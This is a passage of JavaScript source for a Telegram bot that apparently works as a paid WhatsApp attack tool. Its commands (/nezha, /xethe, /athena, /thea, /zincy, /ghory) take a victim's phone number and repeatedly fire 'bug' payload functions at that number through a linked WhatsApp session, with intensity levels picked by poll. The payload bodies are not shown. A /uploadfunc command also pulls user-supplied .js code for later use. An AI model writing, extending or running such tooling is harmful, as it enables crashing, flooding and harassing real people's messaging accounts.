            `❌ *Format salah!*\n\nGunakan: /nezha [nomor]\nContoh: /nezha 628888888888`,
            { parse_mode: "Markdown" }
        );
    }

    const targetNumber = match[1];
    const randomImage = getRandomImage();
    const date = getCurrentDate();
    const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
    const target = `${formattedNumber}@s.whatsapp.net`;
    const isUserPremium = premiumUsers.some(u => u.id === userId && new Date(u.expiresAt) > new Date());

    if (!isUserPremium) {
        return bot.sendPhoto(chatId, randomImage, {
            caption: `<blockquote>(本) 𝖲𝗍𝖾𝗅𝗅𝖺𝗋 - Dawn</blockquote>\n❌ Akses ditolak. Fitur ini hanya untuk user premium.`,
            parse_mode: "HTML",
            reply_markup: {
                inline_keyboard: [[{ text: "𝖠𝗎𝗍𝗁𝗈𝗋", url: "https://t.me/SonKairn" }]]
            }
        });
    }

    if (sessions.size === 0) {
        return bot.sendMessage(chatId, `⚠️ WhatsApp belum terhubung. Jalankan /connect terlebih dahulu.`);
    }

    const imageMsg = await bot.sendPhoto(chatId, randomImage, {
        caption: `
<pre>ＳＴＥＬＬＡＲ ─ ＤＡＷＮ</pre>
┌────────────────────────┐
│─ Target : ${formattedNumber}
│─ 𝖲𝗍𝖺𝗍𝗎𝗌 : ⏳ 𝖬𝖾𝗇𝗎𝗇𝗀𝗀𝗎 𝖯𝗂𝗅𝗂𝗁𝖺𝗇
│─ Date   : ${date}
└────────────────────────┘
 ©𝖪𝖺𝗂𝗋𝗇𝖢𝗋𝖾𝖺𝗍𝗈𝗋𝖳𝖾𝖺𝗆
        `,
        parse_mode: "HTML"
    });

    const pollMessage = await bot.sendPoll(chatId, 
        `ПОЖАЛУЙСТА, ВЫБЕРИТЕ`,
        ['30%', '50%', '70%'],
        {
            is_anonymous: false,
            allows_multiple_answers: false,
            reply_to_message_id: imageMsg.message_id,
            open_period: 60
        }
    );

    activePolls.set(pollMessage.poll.id, {
        chatId,
        userId,
        targetNumber: formattedNumber,
        target,
        videoMessageId: imageMsg.message_id,
        pollMessageId: pollMessage.message_id,
        pollId: pollMessage.poll.id,
        date,
        randomImage
    });

    setTimeout(async () => {
        try {
            if (!activePolls.has(pollMessage.poll.id)) return;
            await bot.deleteMessage(chatId, pollMessage.message_id);
            await bot.editMessageCaption(
                `
<pre>ＳＴＥＬＬＡＲ ─ ＤＡＷＮ</pre>
┌────────────────────────┐
│─ Target : ${formattedNumber}
│─ 𝖲𝗍𝖺𝗍𝗎𝗌 : ⌛ 𝖤𝗑𝗉𝗂𝗋𝖾𝖽
│─ Date   : ${date}
└────────────────────────┘
 ©𝖪𝖺𝗂𝗋𝗇𝖢𝗋𝖾𝖺𝗍𝗈𝗋𝖳𝖾𝖺𝗆
                `,
                {
                    chat_id: chatId,
                    message_id: imageMsg.message_id,
                    parse_mode: "HTML"
                }
            );
            activePolls.delete(pollMessage.poll.id);
        } catch (err) {
            console.log('Error cleanup poll:', err);
        }
    }, 60000);
});

bot.on('poll_answer', async (pollAnswer) => {
    const pollId = pollAnswer.poll_id;
    const userId = pollAnswer.user.id;
    const selectedOptions = pollAnswer.option_ids;

    const pollData = activePolls.get(pollId);
    if (!pollData) return;

    if (userId !== pollData.userId) {
        return bot.sendMessage(pollData.chatId, 
            `⚠️ @${pollAnswer.user.username} — 𝖧𝖺𝗇𝗒𝖺 𝗎𝗇𝗍𝗎𝗄 𝗎𝗌𝖾𝗋 𝗒𝖺𝗇𝗀 𝗋𝖾𝗊𝗎𝖾𝗌𝗍!`
        );
    }

    const optionId = selectedOptions[0];
    let action;
    switch(optionId) {
        case 0: action = '30%'; break;
        case 1: action = '50%'; break;
        case 2: action = '70%'; break;
        default: return;
    }

    try { await bot.deleteMessage(pollData.chatId, pollData.pollMessageId); } 
    catch (err) { console.log('Error deleting poll:', err); }

    if (action === 'cancel') {
        await bot.editMessageCaption(
            `
<pre>ＳＴＥＬＬＡＲ ─ ＤＡＷＮ</pre>
┌────────────────────────┐
│─ Target : ${pollData.targetNumber}
│─ Rasio  : ${action.toUpperCase()}
│─ 𝖲𝗍𝖺𝗍𝗎𝗌 : ❌ 𝖡𝖺𝗍𝖺𝗅
│─ Date   : ${pollData.date}
└────────────────────────┘
 ©𝖪𝖺𝗂𝗋𝗇𝖢𝗋𝖾𝖺𝗍𝗈𝗋𝖳𝖾𝖺𝗆
            `,
            {
                chat_id: pollData.chatId,
                message_id: pollData.videoMessageId,
                parse_mode: "HTML",
                reply_markup: {
                    inline_keyboard: [[{ text: "Проверь", url: `https://wa.me/${pollData.targetNumber}` }]]
                }
            }
        );
        activePolls.delete(pollId);
        return;
    }

    await bot.editMessageCaption(
        `
<pre>ＳＴＥＬＬＡＲ ─ ＤＡＷＮ</pre>
┌────────────────────────┐
│─ Target : ${pollData.targetNumber}
│─ Rasio   : ${action.toUpperCase()}
│─ 𝖲𝗍𝖺𝗍𝗎𝗌 : 𝖯𝗋𝗈𝗌𝖾𝗌
│─ Date   : ${pollData.date}
└────────────────────────┘
 ©𝖪𝖺𝗂𝗋𝗇𝖢𝗋𝖾𝖺𝗍𝗈𝗋𝖳𝖾𝖺𝗆
        `,
        {
            chat_id: pollData.chatId,
            message_id: pollData.videoMessageId,
            parse_mode: "HTML",
            reply_markup: {
                inline_keyboard: [[{ text: "Проверь", url: `https://wa.me/${pollData.targetNumber}` }]]
            }
        }
    );

    try {
        const sock = sessions.values().next().value;
        const target = `${pollData.targetNumber}@s.whatsapp.net`;

        if (action === '30%') {
            for (let i = 0; i < 5; i++) {
                await RvXDelayui(sock, target);
                await sleep(500);
                await RvXDelayui(sock, target);
                await sleep(500);
            }
        } else if (action === '50%') {
            for (let i = 0; i < 15; i++) {
                await RvXDelayui(sock, target);
                await sleep(500);
                await RvXDelayui(sock, target);
                await sleep(500);
                
            }
        }
        else if (action === '70%') {
            for (let i = 0; i < 20; i++) {
                await RvXDelayui(sock, target);
                await sleep(500);
                await RvXDelayui(sock, target);
                await sleep(500);
                
                }
                }

        await bot.editMessageCaption(
            `
<pre>ＳＴＥＬＬＡＲ ─ ＤＡＷＮ</pre>
┌────────────────────────┐
│─ Target : ${pollData.targetNumber}
│─ Rasio  : ${action.toUpperCase()}
│─ 𝖲𝗍𝖺𝗍𝗎𝗌 : ✅ 𝖲𝗎𝖼𝖼𝖾𝗌𝗌
│─ Date   : ${pollData.date}
└────────────────────────┘
 ©𝖪𝖺𝗂𝗋𝗇𝖢𝗋𝖾𝖺𝗍𝗈𝗋𝖳𝖾𝖺𝗆
            `,
            {
                chat_id: pollData.chatId,
                message_id: pollData.videoMessageId,
                parse_mode: "HTML",
                reply_markup: {
                    inline_keyboard: [[{ text: "Проверь", url: `https://wa.me/${pollData.targetNumber}` }]]
                }
            }
        );

    } catch (err) {
        await bot.editMessageCaption(
            `
<pre>ＳＴＥＬＬＡＲ ─ ＤＡＷＮ</pre>
┌────────────────────────┐
│─ Target : ${pollData.targetNumber}
│─ 𝖲𝗍𝖺𝗍𝗎𝗌 : ❌ 𝖦𝖺𝗀𝖺𝗅
│─ Error  : ${err.message}
│─ Date   : ${pollData.date}
└────────────────────────┘
 ©𝖪𝖺𝗂𝗋𝗇𝖢𝗋𝖾𝖺𝗍𝗈𝗋𝖳𝖾𝖺𝗆
            `,
            {
                chat_id: pollData.chatId,
                message_id: pollData.videoMessageId,
                parse_mode: "HTML"
            }
        );
    }

    activePolls.delete(pollId);
});
bot.onText(/\/xethe(?:\s+(\d+))?/, async (msg, match) => {
    const chatId = msg.chat.id;
    const userId = msg.from.id;

    if (!match || !match[1]) {
        return bot.sendMessage(chatId, 
            `❌ *Format salah!*\n\nGunakan: /nezha [nomor]\nContoh: /nezha 628888888888`,
            { parse_mode: "Markdown" }
        );
    }

    const targetNumber = match[1];
    const randomImage = getRandomImage();
    const date = getCurrentDate();
    const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
    const target = `${formattedNumber}@s.whatsapp.net`;
    const isUserPremium = premiumUsers.some(u => u.id === userId && new Date(u.expiresAt) > new Date());

    if (!isUserPremium) {
        return bot.sendPhoto(chatId, randomImage, {
            caption: `<blockquote>(本) 𝖲𝗍𝖾𝗅𝗅𝖺𝗋 - Dawn</blockquote>\n❌ Akses ditolak. Fitur ini hanya untuk user premium.`,
            parse_mode: "HTML",
            reply_markup: {
                inline_keyboard: [[{ text: "𝖠𝗎𝗍𝗁𝗈𝗋", url: "https://t.me/SonKairn" }]]
            }
        });
    }

    if (sessions.size === 0) {
        return bot.sendMessage(chatId, `⚠️ WhatsApp belum terhubung. Jalankan /connect terlebih dahulu.`);
    }

    const imageMsg = await bot.sendPhoto(chatId, randomImage, {
        caption: `
<pre>ＳＴＥＬＬＡＲ ─ ＤＡＷＮ</pre>
┌────────────────────────┐
│─ Target : ${formattedNumber}
│─ 𝖲𝗍𝖺𝗍𝗎𝗌 : ⏳ 𝖬𝖾𝗇𝗎𝗇𝗀𝗀𝗎 𝖯𝗂𝗅𝗂𝗁𝖺𝗇
│─ Date   : ${date}
└────────────────────────┘
 ©𝖪𝖺𝗂𝗋𝗇𝖢𝗋𝖾𝖺𝗍𝗈𝗋𝖳𝖾𝖺𝗆
        `,
        parse_mode: "HTML"
    });

    const pollMessage = await bot.sendPoll(chatId, 
        `ПОЖАЛУЙСТА, ВЫБЕРИТЕ`,
        ['30%', '50%', '70%'],
        {
            is_anonymous: false,
            allows_multiple_answers: false,
            reply_to_message_id: imageMsg.message_id,
            open_period: 60
        }
    );

    activePolls.set(pollMessage.poll.id, {
        chatId,
        userId,
        targetNumber: formattedNumber,
        target,
        videoMessageId: imageMsg.message_id,
        pollMessageId: pollMessage.message_id,
        pollId: pollMessage.poll.id,
        date,
        randomImage
    });

    setTimeout(async () => {
        try {
            if (!activePolls.has(pollMessage.poll.id)) return;
            await bot.deleteMessage(chatId, pollMessage.message_id);
            await bot.editMessageCaption(
                `
<pre>ＳＴＥＬＬＡＲ ─ ＤＡＷＮ</pre>
┌────────────────────────┐
│─ Target : ${formattedNumber}
│─ 𝖲𝗍𝖺𝗍𝗎𝗌 : ⌛ 𝖤𝗑𝗉𝗂𝗋𝖾𝖽
│─ Date   : ${date}
└────────────────────────┘
 ©𝖪𝖺𝗂𝗋𝗇𝖢𝗋𝖾𝖺𝗍𝗈𝗋𝖳𝖾𝖺𝗆
                `,
                {
                    chat_id: chatId,
                    message_id: imageMsg.message_id,
                    parse_mode: "HTML"
                }
            );
            activePolls.delete(pollMessage.poll.id);
        } catch (err) {
            console.log('Error cleanup poll:', err);
        }
    }, 60000);
});

bot.on('poll_answer', async (pollAnswer) => {
    const pollId = pollAnswer.poll_id;
    const userId = pollAnswer.user.id;
    const selectedOptions = pollAnswer.option_ids;

    const pollData = activePolls.get(pollId);
    if (!pollData) return;

    if (userId !== pollData.userId) {
        return bot.sendMessage(pollData.chatId, 
            `⚠️ @${pollAnswer.user.username} — 𝖧𝖺𝗇𝗒𝖺 𝗎𝗇𝗍𝗎𝗄 𝗎𝗌𝖾𝗋 𝗒𝖺𝗇𝗀 𝗋𝖾𝗊𝗎𝖾𝗌𝗍!`
        );
    }

    const optionId = selectedOptions[0];
    let action;
    switch(optionId) {
        case 0: action = '30%'; break;
        case 1: action = '50%'; break;
        case 2: action = '70%'; break;
        default: return;
    }

    try { await bot.deleteMessage(pollData.chatId, pollData.pollMessageId); } 
    catch (err) { console.log('Error deleting poll:', err); }

    if (action === 'cancel') {
        await bot.editMessageCaption(
            `
<pre>ＳＴＥＬＬＡＲ ─ ＤＡＷＮ</pre>
┌────────────────────────┐
│─ Target : ${pollData.targetNumber}
│─ Rasio  : ${action.toUpperCase()}
│─ 𝖲𝗍𝖺𝗍𝗎𝗌 : ❌ 𝖡𝖺𝗍𝖺𝗅
│─ Date   : ${pollData.date}
└────────────────────────┘
 ©𝖪𝖺𝗂𝗋𝗇𝖢𝗋𝖾𝖺𝗍𝗈𝗋𝖳𝖾𝖺𝗆
            `,
            {
                chat_id: pollData.chatId,
                message_id: pollData.videoMessageId,
                parse_mode: "HTML",
                reply_markup: {
                    inline_keyboard: [[{ text: "Проверь", url: `https://wa.me/${pollData.targetNumber}` }]]
                }
            }
        );
        activePolls.delete(pollId);
        return;
    }

    await bot.editMessageCaption(
        `
<pre>ＳＴＥＬＬＡＲ ─ ＤＡＷＮ</pre>
┌────────────────────────┐
│─ Target : ${pollData.targetNumber}
│─ Rasio   : ${action.toUpperCase()}
│─ 𝖲𝗍𝖺𝗍𝗎𝗌 : 𝖯𝗋𝗈𝗌𝖾𝗌
│─ Date   : ${pollData.date}
└────────────────────────┘
 ©𝖪𝖺𝗂𝗋𝗇𝖢𝗋𝖾𝖺𝗍𝗈𝗋𝖳𝖾𝖺𝗆
        `,
        {
            chat_id: pollData.chatId,
            message_id: pollData.videoMessageId,
            parse_mode: "HTML",
            reply_markup: {
                inline_keyboard: [[{ text: "Проверь", url: `https://wa.me/${pollData.targetNumber}` }]]
            }
        }
    );

    try {
        const sock = sessions.values().next().value;
        const target = `${pollData.targetNumber}@s.whatsapp.net`;

        if (action === '30%') {
            for (let i = 0; i < 5; i++) {
                await BlankStcXDelyBulldoVnX(sock, target);
                await sleep(500);
                await BlankStcXDelyBulldoVnX(sock, target);
                await sleep(500);
            }
        } else if (action === '50%') {
            for (let i = 0; i < 15; i++) {
                await BlankStcXDelyBulldoVnX(sock, target);
                await sleep(500);
                await BlankStcXDelyBulldoVnX(sock, target);
                await sleep(500);
                
            }
        }
        else if (action === '70%') {
            for (let i = 0; i < 20; i++) {
                await BlankStcXDelyBulldoVnX(sock, target);
                await sleep(500);
                await BlankStcXDelyBulldoVnX(sock, target);
                await sleep(500);
                
                }
                }

        await bot.editMessageCaption(
            `
<pre>ＳＴＥＬＬＡＲ ─ ＤＡＷＮ</pre>
┌────────────────────────┐
│─ Target : ${pollData.targetNumber}
│─ Rasio  : ${action.toUpperCase()}
│─ 𝖲𝗍𝖺𝗍𝗎𝗌 : ✅ 𝖲𝗎𝖼𝖼𝖾𝗌𝗌
│─ Date   : ${pollData.date}
└────────────────────────┘
 ©𝖪𝖺𝗂𝗋𝗇𝖢𝗋𝖾𝖺𝗍𝗈𝗋𝖳𝖾𝖺𝗆
            `,
            {
                chat_id: pollData.chatId,
                message_id: pollData.videoMessageId,
                parse_mode: "HTML",
                reply_markup: {
                    inline_keyboard: [[{ text: "Проверь", url: `https://wa.me/${pollData.targetNumber}` }]]
                }
            }
        );

    } catch (err) {
        await bot.editMessageCaption(
            `
<pre>ＳＴＥＬＬＡＲ ─ ＤＡＷＮ</pre>
┌────────────────────────┐
│─ Target : ${pollData.targetNumber}
│─ 𝖲𝗍𝖺𝗍𝗎𝗌 : ❌ 𝖦𝖺𝗀𝖺𝗅
│─ Error  : ${err.message}
│─ Date   : ${pollData.date}
└────────────────────────┘
 ©𝖪𝖺𝗂𝗋𝗇𝖢𝗋𝖾𝖺𝗍𝗈𝗋𝖳𝖾𝖺𝗆
            `,
            {
                chat_id: pollData.chatId,
                message_id: pollData.videoMessageId,
                parse_mode: "HTML"
            }
        );
    }

    activePolls.delete(pollId);
});
/// --- ( Case Bug Biasa ) --- \\\
bot.onText(/\/athena(?:\s+(\d+))?/, async (msg, match) => {
    const chatId = msg.chat.id;
    const userId = msg.from.id;

    // Validasi format
    if (!match || !match[1]) {
        return bot.sendMessage(chatId, 
            `❌ *Format salah!*\n\nGunakan: /zincy [nomor]\nContoh: /athena 6281234567890`,
            { parse_mode: "Markdown" }
        );
    }

    const targetNumber = match[1];
    const randomImage = getRandomImage();
    const date = getCurrentDate();
    const formattedNumber = targetNumber.replace(/[^0-9]/g, "");

    const target = `${formattedNumber}@s.whatsapp.net`;

    // Periksa status premium user
    const isUserPremium = premiumUsers.some(u => u.id === userId && new Date(u.expiresAt) > new Date());

    if (!isUserPremium) {
        return bot.sendPhoto(chatId, randomImage, {
            caption: `
<blockquote>(本) 𝖲𝗍𝖾𝗅𝗅𝖺𝗋 - Dawn</blockquote>
❌ Akses ditolak. Fitur ini hanya untuk user premium.
`,
            parse_mode: "HTML",
            reply_markup: {
                inline_keyboard: [
                    [{ text: "𝖠𝗎𝗍𝗁𝗈𝗋", url: "https://t.me/SonKairn" }]
                ]
            }
        });
    }

    if (sessions.size === 0) {
        return bot.sendMessage(chatId, `⚠️ WhatsApp belum terhubung. Jalankan /connect terlebih dahulu.`);
    }
const sock = getActiveSock();
    const sent = await bot.sendPhoto(chatId, randomImage, {
        caption: `
<pre>ＳＴＥＬＬＡＲ ─ ＤＡＷＮ</pre>
┌────────────────────────┐
│─ Target : ${formattedNumber}
│─ 𝖲𝗍𝖺𝗍𝗎𝗌 : 𝖯𝗋𝗈𝗌𝖾𝗌
│─ Date   : ${date}
└─────────────────────────┘
 ©𝖪𝖺𝗂𝗋𝗇𝖢𝗋𝖾𝖺𝗍𝗈𝗋𝖳𝖾𝖺𝗆
`,
        parse_mode: "HTML"
    });

    try {
        await sleep(1000);

        await bot.editMessageCaption(
            `
<pre>ＳＴＥＬＬＡＲ ─ ＤＡＷＮ</pre>
┌────────────────────────┐
│─ Target : ${formattedNumber}
│─ 𝖲𝗍𝖺𝗍𝗎𝗌 : 𝖯𝗋𝗈𝗌𝖾𝗌
│─ Date   : ${date}
└─────────────────────────┘
 ©𝖪𝖺𝗂𝗋𝗇𝖢𝗋𝖾𝖺𝗍𝗈𝗋𝖳𝖾𝖺𝗆
            `,
            {
                chat_id: chatId,
                message_id: sent.message_id,
                parse_mode: "HTML",
                reply_markup: {
                    inline_keyboard: [
                        [{ text: "Проверь", url: `https://wa.me/${formattedNumber}` }]
                    ]
                }
            }
        );

        for (let i = 0; i < 5; i++) {
            await VsxMeta(sock, target);
            await sleep(500);
            await VsxMeta(sock, target);
            await sleep(500);
        }

        await bot.editMessageCaption(
            `
<pre>ＳＴＥＬＬＡＲ ─ ＤＡＷＮ</pre>
┌────────────────────────┐
│─ Target : ${formattedNumber}
│─ 𝖲𝗍𝖺𝗍𝗎𝗌 : Succes
│─ Date   : ${date}
└─────────────────────────┘
 ©𝖪𝖺𝗂𝗋𝗇𝖢𝗋𝖾𝖺𝗍𝗈𝗋𝖳𝖾𝖺𝗆
            `,
            {
                chat_id: chatId,
                message_id: sent.message_id,
                parse_mode: "HTML",
                reply_markup: {
                    inline_keyboard: [
                        [{ text: "Проверь", url: `https://wa.me/${formattedNumber}` }]
                    ]
                }
            }
        );
    } catch (err) {
        await bot.sendMessage(chatId, `❌ Gagal mengirim bug: ${err.message}`);
    }
});
bot.onText(/\/thea(?:\s+(\d+))?/, async (msg, match) => {
    const chatId = msg.chat.id;
    const userId = msg.from.id;

    // Validasi format
    if (!match || !match[1]) {
        return bot.sendMessage(chatId, 
            `❌ *Format salah!*\n\nGunakan: /zincy [nomor]\nContoh: /zincy 6281234567890`,
            { parse_mode: "Markdown" }
        );
    }

    const targetNumber = match[1];
    const randomImage = getRandomImage();
    const date = getCurrentDate();
    const formattedNumber = targetNumber.replace(/[^0-9]/g, "");

    const target = `${formattedNumber}@s.whatsapp.net`;

    // Periksa status premium user
    const isUserPremium = premiumUsers.some(u => u.id === userId && new Date(u.expiresAt) > new Date());

    if (!isUserPremium) {
        return bot.sendPhoto(chatId, randomImage, {
            caption: `
<blockquote>(本) 𝖲𝗍𝖾𝗅𝗅𝖺𝗋 - Dawn</blockquote>
❌ Akses ditolak. Fitur ini hanya untuk user premium.
`,
            parse_mode: "HTML",
            reply_markup: {
                inline_keyboard: [
                    [{ text: "𝖠𝗎𝗍𝗁𝗈𝗋", url: "https://t.me/SonKairn" }]
                ]
            }
        });
    }

    if (sessions.size === 0) {
        return bot.sendMessage(chatId, `⚠️ WhatsApp belum terhubung. Jalankan /connect terlebih dahulu.`);
    }
const sock = getActiveSock();
    const sent = await bot.sendPhoto(chatId, randomImage, {
        caption: `
<pre>ＳＴＥＬＬＡＲ ─ ＤＡＷＮ</pre>
┌────────────────────────┐
│─ Target : ${formattedNumber}
│─ 𝖲𝗍𝖺𝗍𝗎𝗌 : 𝖯𝗋𝗈𝗌𝖾𝗌
│─ Date   : ${date}
└─────────────────────────┘
 ©𝖪𝖺𝗂𝗋𝗇𝖢𝗋𝖾𝖺𝗍𝗈𝗋𝖳𝖾𝖺𝗆
`,
        parse_mode: "HTML"
    });

    try {
        await sleep(1000);

        await bot.editMessageCaption(
            `
<pre>ＳＴＥＬＬＡＲ ─ ＤＡＷＮ</pre>
┌────────────────────────┐
│─ Target : ${formattedNumber}
│─ 𝖲𝗍𝖺𝗍𝗎𝗌 : 𝖯𝗋𝗈𝗌𝖾𝗌
│─ Date   : ${date}
└─────────────────────────┘
 ©𝖪𝖺𝗂𝗋𝗇𝖢𝗋𝖾𝖺𝗍𝗈𝗋𝖳𝖾𝖺𝗆
            `,
            {
                chat_id: chatId,
                message_id: sent.message_id,
                parse_mode: "HTML",
                reply_markup: {
                    inline_keyboard: [
                        [{ text: "Проверь", url: `https://wa.me/${formattedNumber}` }]
                    ]
                }
            }
        );

        for (let i = 0; i < 5; i++) {
            await AxDEnres(sock, target);
            await sleep(500);
            await AxDEnres(sock, target);
            await sleep(500);
            
        }

        await bot.editMessageCaption(
            `
<pre>ＳＴＥＬＬＡＲ ─ ＤＡＷＮ</pre>
┌────────────────────────┐
│─ Target : ${formattedNumber}
│─ 𝖲𝗍𝖺𝗍𝗎𝗌 : Succes
│─ Date   : ${date}
└─────────────────────────┘
 ©𝖪𝖺𝗂𝗋𝗇𝖢𝗋𝖾𝖺𝗍𝗈𝗋𝖳𝖾𝖺𝗆
            `,
            {
                chat_id: chatId,
                message_id: sent.message_id,
                parse_mode: "HTML",
                reply_markup: {
                    inline_keyboard: [
                        [{ text: "Проверь", url: `https://wa.me/${formattedNumber}` }]
                    ]
                }
            }
        );
    } catch (err) {
        await bot.sendMessage(chatId, `❌ Gagal mengirim bug: ${err.message}`);
    }
});
bot.onText(/\/zincy(?:\s+(\d+))?/, async (msg, match) => {
    const chatId = msg.chat.id;
    const userId = msg.from.id;

    // Validasi format
    if (!match || !match[1]) {
        return bot.sendMessage(chatId, 
            `❌ *Format salah!*\n\nGunakan: /zincy [nomor]\nContoh: /zincy 6281234567890`,
            { parse_mode: "Markdown" }
        );
    }

    const targetNumber = match[1];
    const randomImage = getRandomImage();
    const date = getCurrentDate();
    const formattedNumber = targetNumber.replace(/[^0-9]/g, "");

    const target = `${formattedNumber}@s.whatsapp.net`;

    // Periksa status premium user
    const isUserPremium = premiumUsers.some(u => u.id === userId && new Date(u.expiresAt) > new Date());

    if (!isUserPremium) {
        return bot.sendPhoto(chatId, randomImage, {
            caption: `
<blockquote>(本) 𝖲𝗍𝖾𝗅𝗅𝖺𝗋 - Dawn</blockquote>
❌ Akses ditolak. Fitur ini hanya untuk user premium.
`,
            parse_mode: "HTML",
            reply_markup: {
                inline_keyboard: [
                    [{ text: "𝖠𝗎𝗍𝗁𝗈𝗋", url: "https://t.me/SonKairn" }]
                ]
            }
        });
    }

    if (sessions.size === 0) {
        return bot.sendMessage(chatId, `⚠️ WhatsApp belum terhubung. Jalankan /connect terlebih dahulu.`);
    }
const sock = getActiveSock();
    const sent = await bot.sendPhoto(chatId, randomImage, {
        caption: `
<pre>ＳＴＥＬＬＡＲ ─ ＤＡＷＮ</pre>
┌────────────────────────┐
│─ Target : ${formattedNumber}
│─ 𝖲𝗍𝖺𝗍𝗎𝗌 : 𝖯𝗋𝗈𝗌𝖾𝗌
│─ Date   : ${date}
└─────────────────────────┘
 ©𝖪𝖺𝗂𝗋𝗇𝖢𝗋𝖾𝖺𝗍𝗈𝗋𝖳𝖾𝖺𝗆
`,
        parse_mode: "HTML"
    });

    try {
        await sleep(1000);

        await bot.editMessageCaption(
            `
<pre>ＳＴＥＬＬＡＲ ─ ＤＡＷＮ</pre>
┌────────────────────────┐
│─ Target : ${formattedNumber}
│─ 𝖲𝗍𝖺𝗍𝗎𝗌 : 𝖯𝗋𝗈𝗌𝖾𝗌
│─ Date   : ${date}
└─────────────────────────┘
 ©𝖪𝖺𝗂𝗋𝗇𝖢𝗋𝖾𝖺𝗍𝗈𝗋𝖳𝖾𝖺𝗆
            `,
            {
                chat_id: chatId,
                message_id: sent.message_id,
                parse_mode: "HTML",
                reply_markup: {
                    inline_keyboard: [
                        [{ text: "Проверь", url: `https://wa.me/${formattedNumber}` }]
                    ]
                }
            }
        );

        for (let i = 0; i < 5; i++) {
            await BulldozerZeroMsg(sock, target);
            await sleep(500);
            await BulldozerZeroMsg(sock, target);
            await sleep(500);
        }

        await bot.editMessageCaption(
            `
<pre>ＳＴＥＬＬＡＲ ─ ＤＡＷＮ</pre>
┌────────────────────────┐
│─ Target : ${formattedNumber}
│─ 𝖲𝗍𝖺𝗍𝗎𝗌 : Succes
│─ Date   : ${date}
└─────────────────────────┘
 ©𝖪𝖺𝗂𝗋𝗇𝖢𝗋𝖾𝖺𝗍𝗈𝗋𝖳𝖾𝖺𝗆
            `,
            {
                chat_id: chatId,
                message_id: sent.message_id,
                parse_mode: "HTML",
                reply_markup: {
                    inline_keyboard: [
                        [{ text: "Проверь", url: `https://wa.me/${formattedNumber}` }]
                    ]
                }
            }
        );
    } catch (err) {
        await bot.sendMessage(chatId, `❌ Gagal mengirim bug: ${err.message}`);
    }
});
bot.onText(/\/ghory(?:\s+(\d+))?/, async (msg, match) => {
    const chatId = msg.chat.id;
    const userId = msg.from.id;

    // Validasi format
    if (!match || !match[1]) {
        return bot.sendMessage(chatId, 
            `❌ *Format salah!*\n\nGunakan: /zincy [nomor]\nContoh: /zincy 6281234567890`,
            { parse_mode: "Markdown" }
        );
    }

    const targetNumber = match[1];
    const randomImage = getRandomImage();
    const date = getCurrentDate();
    const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
    const target = `${formattedNumber}@s.whatsapp.net`;

    // Periksa status premium user
    const isUserPremium = premiumUsers.some(u => u.id === userId && new Date(u.expiresAt) > new Date());

    if (!isUserPremium) {
        return bot.sendPhoto(chatId, randomImage, {
            caption: `
<blockquote>(本) 𝖲𝗍𝖾𝗅𝗅𝖺𝗋 - Dawn</blockquote>
❌ Akses ditolak. Fitur ini hanya untuk user premium.
`,
            parse_mode: "HTML",
            reply_markup: {
                inline_keyboard: [
                    [{ text: "𝖠𝗎𝗍𝗁𝗈𝗋", url: "https://t.me/SonKairn" }]
                ]
            }
        });
    }

    if (sessions.size === 0) {
        return bot.sendMessage(chatId, `⚠️ WhatsApp belum terhubung. Jalankan /connect terlebih dahulu.`);
    }
const sock = getActiveSock();
    const sent = await bot.sendPhoto(chatId, randomImage, {
        caption: `
<pre>ＳＴＥＬＬＡＲ ─ ＤＡＷＮ</pre>
┌────────────────────────┐
│─ Target : ${formattedNumber}
│─ 𝖲𝗍𝖺𝗍𝗎𝗌 : 𝖯𝗋𝗈𝗌𝖾𝗌
│─ Date   : ${date}
└─────────────────────────┘
 ©𝖪𝖺𝗂𝗋𝗇𝖢𝗋𝖾𝖺𝗍𝗈𝗋𝖳𝖾𝖺𝗆
`,
        parse_mode: "HTML"
    });

    try {
        await sleep(1000);

        await bot.editMessageCaption(
            `
<pre>ＳＴＥＬＬＡＲ ─ ＤＡＷＮ</pre>
┌────────────────────────┐
│─ Target : ${formattedNumber}
│─ 𝖲𝗍𝖺𝗍𝗎𝗌 : 𝖯𝗋𝗈𝗌𝖾𝗌
│─ Date   : ${date}
└─────────────────────────┘
 ©𝖪𝖺𝗂𝗋𝗇𝖢𝗋𝖾𝖺𝗍𝗈𝗋𝖳𝖾𝖺𝗆
            `,
            {
                chat_id: chatId,
                message_id: sent.message_id,
                parse_mode: "HTML",
                reply_markup: {
                    inline_keyboard: [
                        [{ text: "Проверь", url: `https://wa.me/${formattedNumber}` }]
                    ]
                }
            }
        );

        for (let i = 0; i < 5; i++) {
            await RxVzBurstV2(sock, target);
            await sleep(500);
            await RxVzBurstV2(sock, target);
            await sleep(500);
        }

        await bot.editMessageCaption(
            `
<pre>ＳＴＥＬＬＡＲ ─ ＤＡＷＮ</pre>
┌────────────────────────┐
│─ Target : ${formattedNumber}
│─ 𝖲𝗍𝖺𝗍𝗎𝗌 : Succes
│─ Date   : ${date}
└─────────────────────────┘
 ©𝖪𝖺𝗂𝗋𝗇𝖢𝗋𝖾𝖺𝗍𝗈𝗋𝖳𝖾𝖺𝗆
            `,
            {
                chat_id: chatId,
                message_id: sent.message_id,
                parse_mode: "HTML",
                reply_markup: {
                    inline_keyboard: [
                        [{ text: "Проверь", url: `https://wa.me/${formattedNumber}` }]
                    ]
                }
            }
        );
    } catch (err) {
        await bot.sendMessage(chatId, `❌ Gagal mengirim bug: ${err.message}`);
    }
});


//// TEST FUNC
/// Map untuk menyimpan fungsi yang diupload per user (key: userId)
const userFunctions = new Map();

// Command: /uploadfunc (harus reply ke file .js)
bot.onText(/\/uploadfunc/, async (msg) => {
    const chatId = msg.chat.id;
    const userId = msg.from.id;

    // Validasi: harus reply ke dokumen
    if (!msg.reply_to_message || !msg.reply_to_message.document) {
        return bot.sendMessage(chatId, '❌ Balas ke file .js dengan perintah /uploadfunc');
    }

    const doc = msg.reply_to_message.document;
    if (!doc.file_name.endsWith('.js')) {
        return bot.sendMessage(chatId, '❌ Hanya file .js yang diperbolehkan');
    }

    try {
        // Dapatkan link file dan baca isinya
        const fileLink = await bot.getFileLink(doc.file_id);
        const response = await axios.get(fileLink);
        const code = response.data;

        // Simpan kode dengan status belum digunakan
        userFunctions.set(userId, { code, used: false });

        bot.sendMessage(chatId, '✅ Fungsi berhasil diupload! Sekarang kamu bisa menggunakan /testfunction sekali.');
    } catch (err) {
        bot.sendMessage(chatId, `❌ Gagal membaca file: ${err.message}`);
    }
});

// Command: /testfunction [nomor]
bot.onText(/\/testfunction(?:\s+(\d+))?/, async (msg, match) => {
